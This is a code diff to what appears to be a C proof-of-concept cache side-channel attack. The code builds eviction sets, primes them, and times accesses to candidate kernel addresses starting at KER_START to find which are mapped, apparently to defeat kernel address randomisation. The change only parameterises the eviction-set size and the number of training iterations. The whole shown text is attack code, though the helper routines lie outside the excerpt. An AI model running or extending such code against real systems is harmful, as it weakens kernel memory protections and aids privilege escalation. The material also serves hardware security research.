@@ -27,7 +27,7 @@ int leak_val(void *addr) {
 }
 
 void get_cycle(uint64_t *valid_cycle, uint64_t *invalid_cycle) {
-  void *eset[12];
+  void *eset[ESET_SIZE];
   register uint64_t tmp;
 
   gen_eset(&eset_data[0], eset, &eset_data[0]);
@@ -52,8 +52,8 @@ void get_cycle(uint64_t *valid_cycle, uint64_t *invalid_cycle) {
 
 int main(int argc, char *argv[]) {
   void *addr;
-  void *eset[12];
-  void *target[4] = {user, user, user};
+  void *eset[ESET_SIZE];
+  void *target[TRAINING_ITERS] = {user, user, user, user, user, user};
   uint64_t valid_cycle, invalid_cycle;
   struct timeval tv_s, tv_e;
   register uint64_t tmp, threshold;
@@ -82,10 +82,10 @@ int main(int argc, char *argv[]) {
     for (uint64_t s_idx = 0; s_idx < NUM_SLOT; s_idx++) {
       idx = (s_idx * 73) % NUM_SLOT;
       addr = (void *)KER_START + (ALIGN_SIZE * idx);
-      target[2] = addr;
+      target[TRAINING_ITERS - 1] = addr;
       gen_eset(addr, eset, &eset_data[0]);
       do {
-        for (int j = 0; j < 3; j++) {
+        for (int j = 0; j < TRAINING_ITERS; j++) {
           prime(eset);
           leak_val(target[j]);
         }
